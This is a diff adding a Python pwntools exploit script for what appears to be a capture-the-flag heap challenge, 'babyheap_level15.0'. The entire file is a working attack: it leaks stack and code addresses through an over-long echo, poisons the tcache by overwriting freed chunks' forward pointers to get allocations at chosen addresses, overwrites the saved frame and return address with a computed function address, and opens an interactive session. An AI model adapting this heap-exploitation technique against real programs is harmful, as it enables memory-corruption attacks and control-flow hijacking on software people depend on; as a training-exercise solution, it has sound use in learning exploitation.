@@ -1,0 +1,75 @@
+from pwn import *
+
+r = process("/challenge/babyheap_level15.0")
+r.read()
+for i in range(0,2):
+        r.sendline(b"malloc")
+        r.sendline(str(i).encode())
+        r.sendline(b"32")
+r.read()
+for lock in range(0,3):
+	r.sendline(b"echo")
+	r.sendline(b"0")
+	r.sendline(b"200")
+r.read()
+r.read()
+r.read()
+r.read()
+r.read()
+leak = r.read()[6:-1]
+leak = int.from_bytes(leak,byteorder='little')
+log.info(f"Leak Stack {hex(leak)}")
+rbp = leak+366
+log.info(f"Saved Rbp {hex(rbp)}")
+alloc = rbp-184
+log.info(f"Alloction {hex(alloc)}")
+ret = rbp + 8
+log.info(f"Ret Addr {hex(ret)}")
+for i in range(0,3):
+        r.sendline(b"malloc")
+        r.sendline(str(i).encode())
+        r.sendline(b"32")
+r.sendline(b"free")
+r.sendline(b"2")
+r.sendline(b"free")
+r.sendline(b"1")
+r.sendline(b"read")
+r.sendline(b"0")
+r.sendline(b"64")
+r.sendline(p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x31)+p64(alloc))
+for i in range(0,2):
+        r.sendline(b"malloc")
+        r.sendline(str(i).encode())
+        r.sendline(b"32")
+r.sendline(b'echo')
+r.sendline(b'1')
+r.read()
+r.sendline(b'112')
+r.read()
+basse = r.read()[6:-1]
+basse = int.from_bytes(basse,byteorder='little')
+basse = str(hex(basse))[:-4]+"4b00"
+log.info(f"Basse Addr Functions {basse}")
+basse = int(basse,16)
+for i in range(0,3):
+        r.sendline(b"malloc")
+        r.sendline(str(i).encode())
+        r.sendline(b"32")
+r.sendline(b"free")
+r.sendline(b"2")
+r.sendline(b"free")
+r.sendline(b"1")
+r.sendline(b"read")
+r.sendline(b"0")
+r.sendline(b"64")
+r.sendline(p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x31)+p64(rbp))
+for i in range(0,2):
+        r.sendline(b"malloc")
+        r.sendline(str(i).encode())
+        r.sendline(b"32")
+r.sendline(b"read")
+r.sendline(b"1")
+r.sendline(b"16")
+r.sendline(p64(0x0)+p64(basse))
+r.sendline(b"quit")
+r.interactive()
